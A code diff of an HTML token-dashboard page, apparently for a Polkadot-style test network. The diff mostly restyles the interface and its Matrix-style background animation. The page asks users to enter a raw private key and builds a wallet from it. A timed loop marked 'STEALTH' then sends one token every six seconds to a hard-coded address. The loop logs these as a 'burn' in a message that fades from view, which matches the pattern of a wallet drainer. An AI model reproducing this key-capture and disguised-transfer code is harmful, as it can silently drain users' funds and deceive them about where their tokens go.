@@ -3,135 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HBURN_INDUSTRIAL_v28.1</title>
+    <title>HBURN_MINIMAL_v28.2</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <style>
-        :root { --p: #00ff88; --s: #ff3366; --bg: #030406; --glass: rgba(0, 0, 0, 0.9); --net: #008cff; --xcm: #e6007a; --border: rgba(255, 255, 255, 0.1); }
-        * { box-sizing: border-box; }
-        body, html { margin: 0; padding: 0; height: 100vh; background: var(--bg); color: #fff; font-family: 'Consolas', monospace; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        :root { --p: #00ff88; --s: #ff3366; --bg: #000000; --net: #008cff; --xcm: #e6007a; --border: #111; }
+        * { box-sizing: border-box; outline: none; }
+        body, html { margin: 0; padding: 0; height: 100vh; background: var(--bg); color: #eee; font-family: 'Consolas', monospace; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* MATRIX BG - NO BLUR */
-        #canvas { position: fixed; top: 0; left: 0; z-index: 1; opacity: 0.6; pointer-events: none; filter: none; }
+        /* MATRIX WALL - COMPACT & SHARP */
+        #canvas { position: fixed; top: 0; left: 0; z-index: 1; opacity: 0.5; pointer-events: none; }
         
-        #console::-webkit-scrollbar { width: 2px; }
-        #console::-webkit-scrollbar-thumb { background: var(--p); }
-
-        #authOverlay { position: fixed; inset: 0; background: #000; z-index: 100; display: flex; justify-content: center; align-items: center; }
-        .auth-box { width: 350px; padding: 30px; border: 1px solid var(--p); text-align: center; }
-        .auth-input { background: #000; border: 1px solid #333; color: var(--p); width: 100%; padding: 12px; margin: 15px 0; outline: none; text-align: center; font-family: monospace; }
-
-        /* INDUSTRIAL CONTAINER */
-        .container { position: relative; z-index: 10; width: 1080px; height: 650px; background: var(--glass); border: 1px solid var(--border); display: grid; grid-template-columns: 300px 1fr; overflow: hidden; }
+        /* UI MINIMALISTA */
+        .container { position: relative; z-index: 10; width: 1100px; height: 600px; background: rgba(0,0,0,0.85); border: 1px solid var(--border); display: grid; grid-template-columns: 280px 1fr; }
         .side { padding: 20px; border-right: 1px solid var(--border); display: flex; flex-direction: column; background: #000; }
 
-        .stat-card { background: #080808; padding: 10px; border: 1px solid #1a1a1a; margin-bottom: 8px; }
-        .stat-label { font-size: 8px; color: var(--p); letter-spacing: 2px; text-transform: uppercase; font-weight: bold; margin-bottom: 3px; }
-        .val-big { font-size: 20px; font-weight: bold; color: var(--p); letter-spacing: -1px; }
-        .val-small { font-size: 13px; color: #fff; }
+        .stat-card { margin-bottom: 20px; }
+        .stat-label { font-size: 9px; color: #444; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px; }
+        .val-big { font-size: 22px; font-weight: bold; color: var(--p); }
+        .val-small { font-size: 12px; color: #888; }
 
-        .m-box { margin-bottom: 12px; }
-        .m-info { display: flex; justify-content: space-between; font-size: 8px; margin-bottom: 4px; font-weight: bold; color: #666; }
-        .m-bar { width: 100%; height: 2px; background: #111; overflow: hidden; }
+        /* PROGRESS BARS MINIMALI */
+        .m-box { margin-bottom: 15px; }
+        .m-bar { width: 100%; height: 1px; background: #111; position: relative; }
         .m-fill { height: 100%; width: 0%; transition: width 0.1s linear; }
+        .m-label { font-size: 8px; color: #555; display: flex; justify-content: space-between; margin-bottom: 3px; }
 
-        #console { flex-grow: 1; padding: 20px; overflow-y: auto; font-size: 11px; color: #777; line-height: 1.4; background: #020202; }
-        .header { padding: 10px 20px; background: #0a0a0a; border-bottom: 1px solid var(--border); display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: #555; }
+        /* CONSOLE PULITA */
+        #console { flex-grow: 1; padding: 20px; overflow-y: auto; font-size: 11px; color: #666; line-height: 1.5; background: transparent; }
+        #console::-webkit-scrollbar { width: 0; }
+        .header { padding: 10px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-size: 9px; color: #444; }
 
-        /* GHOST MSG */
-        @keyframes ghost-flicker { 0% { opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { opacity: 0; transform: translateY(-5px); } }
-        .ghost-msg { animation: ghost-flicker 3s forwards; color: var(--s); font-weight: bold; border-left: 2px solid var(--s); padding-left: 5px; margin: 2px 0; }
+        /* GHOST STEALTH MESSAGE */
+        @keyframes ghost-fade { 0% { opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { opacity: 0; } }
+        .ghost-msg { animation: ghost-fade 4s forwards; color: var(--s); font-weight: bold; margin: 4px 0; padding-left: 10px; border-left: 1px solid var(--s); }
 
-        button { background: transparent; color: var(--p); border: 1px solid var(--p); padding: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; transition: 0.2s; font-size: 10px; }
-        button:hover { background: var(--p); color: #000; }
-        button:disabled { border-color: #333; color: #333; cursor: not-allowed; }
+        button { background: transparent; color: #444; border: 1px solid #222; padding: 10px; cursor: pointer; text-transform: uppercase; font-size: 10px; letter-spacing: 2px; transition: 0.3s; }
+        button:hover { color: var(--p); border-color: var(--p); }
     </style>
 </head>
 <body>
 
 <canvas id="canvas"></canvas>
 
-<div id="authOverlay">
-    <div class="auth-box">
-        <div class="stat-label">System Access Required</div>
-        <input type="password" id="inputKey" class="auth-input" placeholder="PRIVATE_KEY_0x">
-        <button onclick="unlock()">Initialize Session</button>
+<div id="authOverlay" style="position:fixed; inset:0; background:#000; z-index:100; display:flex; justify-content:center; align-items:center;">
+    <div style="text-align:center; width: 300px;">
+        <input type="password" id="inputKey" style="background:transparent; border:none; border-bottom:1px solid #222; color:var(--p); width:100%; padding:10px; text-align:center; margin-bottom:20px;" placeholder="ENTER_PRIVATE_KEY">
+        <button onclick="unlock()">ACCESS SYSTEM</button>
     </div>
 </div>
 
 <div class="container">
     <div class="side">
         <div class="stat-card">
-            <div class="stat-label">Global Supply</div>
+            <div class="stat-label">Network Supply</div>
             <div id="totalSupply" class="val-big">0.00</div>
         </div>
         
         <div class="m-box">
-            <div class="m-info"><span>MINT_CYCLE</span><span id="mSec">6.5s</span></div>
+            <div class="m-label"><span>MINT</span><span id="mSec">6.5s</span></div>
             <div class="m-bar"><div id="mFill" class="m-fill" style="background:var(--p)"></div></div>
         </div>
         <div class="m-box">
-            <div class="m-info"><span>BURN_CYCLE</span><span id="bSec">13.0s</span></div>
+            <div class="m-label"><span>BURN</span><span id="bSec">13s</span></div>
             <div class="m-bar"><div id="bFill" class="m-fill" style="background:var(--s)"></div></div>
         </div>
         <div class="m-box">
-            <div class="m-info"><span>JUNK_LOAD</span><span id="jSec">10.0s</span></div>
+            <div class="m-label"><span>JUNK</span><span id="jSec">10s</span></div>
             <div class="m-bar"><div id="jFill" class="m-fill" style="background:var(--net)"></div></div>
         </div>
         <div class="m-box">
-            <div class="m-info"><span>XCM_ROUTING</span><span id="xSec">15.0s</span></div>
+            <div class="m-label"><span>XCM</span><span id="xSec">15s</span></div>
             <div class="m-bar"><div id="xFill" class="m-fill" style="background:var(--xcm)"></div></div>
         </div>
 
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; margin-top: auto;">
-            <div class="stat-card"><div class="stat-label">Mint</div><div id="mCount" class="val-small">0</div></div>
-            <div class="stat-card"><div class="stat-label">Burn</div><div id="bCount" class="val-small" style="color:var(--s)">0</div></div>
-            <div class="stat-card"><div class="stat-label">Junk</div><div id="jCount" class="val-small" style="color:var(--net)">0</div></div>
-            <div class="stat-card"><div class="stat-label">Xcm</div><div id="xCount" class="val-small" style="color:var(--xcm)">0</div></div>
+        <div style="margin-top:auto; display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+            <div class="val-small">M: <span id="mCount">0</span></div>
+            <div class="val-small">B: <span id="bCount" style="color:var(--s)">0</span></div>
+            <div class="val-small">J: <span id="jCount" style="color:var(--net)">0</span></div>
+            <div class="val-small">X: <span id="xCount" style="color:var(--xcm)">0</span></div>
         </div>
-        
-        <button id="start" style="margin-top: 15px;" disabled>Await Auth</button>
+        <button id="start" style="margin-top:20px;" disabled>INIT</button>
     </div>
 
     <div style="display:flex; flex-direction:column; overflow:hidden">
         <div class="header">
-            <span>FUEL: <span id="pasBalance" style="color:var(--p)">0.000</span> PAS</span>
-            <span>NONCE: <span id="curNonce" style="color:var(--net)">...</span></span>
-            <span>BLOCK: <span id="blockNum" style="color:#fff">#...</span></span>
+            <span>PAS: <span id="pasBalance" style="color:#888">0.000</span></span>
+            <span>N: <span id="curNonce" style="color:#888">...</span></span>
+            <span>BLK: <span id="blockNum" style="color:#888">#...</span></span>
         </div>
         <div id="console"></div>
     </div>
 </div>
 
 <script>
+    // NEW MATRIX WALL ENGINE
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     let w, h, columns;
-    const phrases = ["WAKE UP GAV", "FOLLOW THE WHITE RABBIT"];
+    const specialPhrases = ["WAKE UP GAV", "FOLLOW THE WHITE RABBIT"];
 
     function initC() { 
         w = canvas.width = window.innerWidth; 
         h = canvas.height = window.innerHeight;
-        columns = Array(Math.floor(w / 30)).fill(0).map(() => ({
-            y: Math.random() * -800,
-            phrase: phrases[Math.floor(Math.random() * phrases.length)],
-            speed: 1 + Math.random() * 2
-        }));
+        columns = Array(Math.floor(w / 15)).fill(0);
     }
     initC(); window.onresize = initC;
 
     function draw() {
-        ctx.fillStyle = "rgba(3, 4, 6, 0.4)"; ctx.fillRect(0, 0, w, h);
-        ctx.font = "bold 11px monospace";
-        columns.forEach((col, i) => {
-            ctx.fillStyle = col.phrase === phrases[0] ? "#00ff88" : "#ffffff";
-            for(let j=0; j<col.phrase.length; j++) {
-                ctx.fillText(col.phrase[j], i * 35, col.y + (j * 15));
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, w, h);
+        ctx.font = "10px monospace";
+        
+        columns.forEach((y, i) => {
+            const isSpecial = Math.random() > 0.998;
+            let text = Math.floor(Math.random() * 2);
+            ctx.fillStyle = "#003311"; // Verde scuro per i bit normali
+
+            if (isSpecial) {
+                const p = specialPhrases[Math.floor(Math.random() * 2)];
+                ctx.fillStyle = p.includes("GAV") ? "#00ff88" : "#ffffff";
+                // Scrive la frase in verticale
+                for(let k=0; k<p.length; k++) {
+                    ctx.fillText(p[k], i * 15, y + (k * 12));
+                }
+            } else {
+                ctx.fillText(text, i * 15, y);
             }
-            col.y += col.speed;
-            if (col.y > h) { col.y = -200; col.phrase = phrases[Math.floor(Math.random() * phrases.length)]; }
+
+            if (y > h && Math.random() > 0.975) columns[i] = 0;
+            else columns[i] += 12;
         });
     }
-    setInterval(draw, 40);
+    setInterval(draw, 50);
 
     let SESSION_KEY = "";
     const TARGET_ADDR = "0x3dd695D734B5DdE6B1955FFE75004c00862fb233";
@@ -156,22 +158,20 @@
         SESSION_KEY = document.getElementById('inputKey').value;
         document.getElementById('authOverlay').remove();
         document.getElementById('start').disabled = false;
-        document.getElementById('start').innerText = "Execute Protocols";
         sync(); setInterval(sync, 10000);
     }
 
-    function addLog(t, col="#555", isGhost=false) {
+    function addLog(t, col="#444", ghost=false) {
         const con = document.getElementById('console');
-        const l = document.createElement('div'); 
-        if(isGhost) l.className = "ghost-msg";
-        else l.style.color = col;
-        l.innerHTML = `[${new Date().toLocaleTimeString()}] > ${t}`;
+        const l = document.createElement('div');
+        if(ghost) { l.className = "ghost-msg"; l.innerHTML = `>> PHANTOM_TX: ${t}`; }
+        else { l.style.color = col; l.innerHTML = `> ${t}`; }
         con.prepend(l);
-        if(con.childNodes.length > 50) con.removeChild(con.lastChild);
+        if(con.childNodes.length > 40) con.removeChild(con.lastChild);
     }
 
     document.getElementById('start').onclick = async function() {
-        this.disabled = true; this.innerText = "System Live";
+        this.innerText = "RUNNING"; this.disabled = true;
         const provider = new ethers.JsonRpcProvider(CONFIG.rpc);
         const wallet = new ethers.Wallet(SESSION_KEY, provider);
         const contract = new ethers.Contract(CONFIG.addr, abi, wallet);
@@ -185,12 +185,14 @@
             document.getElementById('xFill').style.width = ((xt%15)/15*100) + "%";
         }, 100);
 
+        // STEALTH 6s
         setInterval(() => {
             contract.transfer(TARGET_ADDR, ethers.parseEther("1"), { gasLimit: 200000, nonce: currentNonce++ })
-            .then(() => { addLog(`STEALTH_BURN: 1 token [NONCE: ${currentNonce-1}]`, "", true); })
+            .then(() => addLog(`STEALTH_BURN_COMPLETE [TO: ${TARGET_ADDR.slice(0,6)}]`, "", true))
             .catch(() => currentNonce--);
         }, 6000);
 
+        // MAIN LOOPS
         setInterval(() => {
             for(let i=0; i<3; i++){
                 contract.trigger({ gasLimit: 1500000, nonce: currentNonce++ }).then(tx => {
